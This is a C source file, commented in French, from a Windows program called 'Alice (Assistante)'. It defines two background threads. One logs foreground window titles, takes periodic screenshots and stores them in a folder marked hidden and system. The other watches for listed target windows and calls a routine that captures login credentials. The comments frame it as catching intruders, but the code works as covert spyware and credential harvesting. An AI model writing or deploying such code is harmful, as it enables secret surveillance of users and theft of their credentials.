//=============================================================================
// Projet : Alice (Assistante)
// Fichier : threads.c
//
//=============================================================================

#include "resources.h"


//=============================================================================
//    Thread 1 : Controleur (contr�le et enregistre les fen�tres visit�es)
//=============================================================================

DWORD  WINAPI Controleur(LPVOID lParam)
{
   HWND hwnd = NULL;
   char log[MAX_TMP], nomFenActuelle[MAX_FENETRE_TAILLE], nomFenPrecedente[MAX_FENETRE_TAILLE];
   SYSTEMTIME Time;
   
   GetSystemTime(&Time); /* On r�cup�re le temp */
   
   sprintf(dossier, "%s\\%02d-%02d-%02d", PATH_TO_LOG, Time.wDay, Time.wMonth, Time.wYear); /* On cr�e un nv dossier */
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_NORMAL); /* D�verouillage du dossier qui contient les logs */
   CreateDirectory(dossier, NULL); /* S'il existe d�j� il ne sera pas recr�e */
   if (GetLastError() == ERROR_PATH_NOT_FOUND) /* Si PATH_TO_LOG introuvable */
   {
      CreateDirectory(PATH_TO_LOG, NULL); /* Cr�ation du dossier "logs" */
      SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* V�rouillage du dossier */
      CreateDirectory(dossier, NULL); /* On essaye une 2�me fois de le cr�e */
   }
   //SetFileAttributes(PATH_TO_LOG, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM); /* V�rouillage du dossier */
   sprintf(FICHIER_LOG, "%s\\%02d-%02d-%02d.txt", dossier, Time.wDay, Time.wMonth, Time.wYear); /* chemin + nom fichier log */
   
   /* On enregistre l'heure du d�marrage (dans le fichier log) */
   sprintf(log, "# %02d/%02d/%02d - %02d:%02d:%02d : D�marrage\n"
   , Time.wDay, Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);
   enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
   //Sleep(3000); /* On attend 3 secondes */
   if (ACTIVE_MSG_ACCUEIL)
   {
      if ((Time.wHour == jourHeure && Time.wMinute >= jourMinute) || (Time.wHour > jourHeure && Time.wHour < nuitHeure) || (Time.wHour == nuitHeure && Time.wMinute < nuitMinute))
         afficherTrayIconBallon(NOM_APP, "Konichiwa !", 2000, TRUE); /* Message d'acceuil */
      else /* Si nn, c'est le soir */
         afficherTrayIconBallon(NOM_APP, "Konbanwa !", 2000, TRUE); /* "Konishiwa" == "bonjour" et "Konbanwa" == "bonsoir" */
   }
   
   while (1)
   {
      Sleep(300000); /* On attend 5 minutes avant chaque contr�le */
      
      GetSystemTime(&Time); /* On r�cup�re le temp */
      HWND currenthwnd = GetForegroundWindow(); /* Handle de la fen�tre en focus/actuelle */
      GetWindowText(currenthwnd, nomFenActuelle, MAX_FENETRE_TAILLE); /* R�cup�ration du nom de la fen�tre actuelle */
      
      if (currenthwnd != hwnd) /* Si le handle de la fen�tre actuelle != du handle de la fen�tre pr�cedente */
      {
         hwnd = currenthwnd; /* Sauvegarde du hwnd (handle de la fen�tre) */
         sprintf(nomFenPrecedente, "%s", nomFenActuelle); /* Sauvegarde du nom de la fen�tre */
         sprintf(log, "impscreen %s %d", dossier, DEFAULT_IMPR_QUALITY);
         callProgram(SCREENSHOT_EXE, log); /* On lance le programme de capture d'�cran */
         sprintf(log, "=> %02d:%02d : ($)[%s]\n", Time.wHour, Time.wMinute, nomFenActuelle);
         enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
      }
      else if (lstrcmp(nomFenPrecedente, nomFenActuelle)) /* Si le nom de la fen�tre a chang� */
      {
         sprintf(nomFenPrecedente, "%s", nomFenActuelle); /* Sauvegarde du nom de la fen�tre */
         sprintf(log, "=> %02d:%02d : [%s]\n", Time.wHour, Time.wMinute, nomFenActuelle);
         enregistrerEtLireLog(log, &lParam, FICHIER_LOG, TRUE, FALSE, TRUE);
      }
   }

return 0;
}

//=============================================================================
//   Thread 2 : AntiVoyou (enregistre les identifiants des personnes inconnus)
//=============================================================================

DWORD  WINAPI AntiVoyou(LPVOID lParam)
{
   HWND hFenetre = NULL;
   char nomFenetre[MAX_FENETRE_TAILLE], *buffer;
   buffer = malloc(MAX_FENETRE_TAILLE);
   int len;
   
   while (1)
   {
      while (etatConnexion()) /* Tant que la connexion existe */
      {
         hFenetre = GetForegroundWindow(); /* On r�cup�re le handle de la fen�tre qui a le focus */
         GetWindowText(hFenetre, nomFenetre, MAX_FENETRE_TAILLE); /* On r�cup�re le nom de cette fen�tre */
         
         FILE *fichier = fopen(FICHIER_FCIBLE, "r"); /* On ouvre le fichier qui contient les fen�tres cibles */
   
         if (fichier != NULL)
         {
            while (fgets(buffer, MAX_FENETRE_TAILLE, fichier) != NULL) /* On lit ligne par ligne le fichier tant qu'on ne re�oit pas d'erreur */
            {
               len = lstrlen(buffer)-1;
               if (buffer[len] == '\n')
                  buffer[len] = '\0'; /* On enl�ve '\n' de buffer */
               if (rechercherChaineDansChaine(nomFenetre, buffer)) /* Si c'est la fen�tre cible */
               {
                  recupererIdentifiants(&lParam, buffer);
                  break; /* On sort de la derni�re boucle */
               }
            }
      
            fclose(fichier);
         }
         
         Sleep(3000); /* On attend 3 secondes */
      }
      
      Sleep(10000); /* On attend 10 secondes */
      
   } // Sortie du while(1)
   
   free(buffer);

return 0;
}
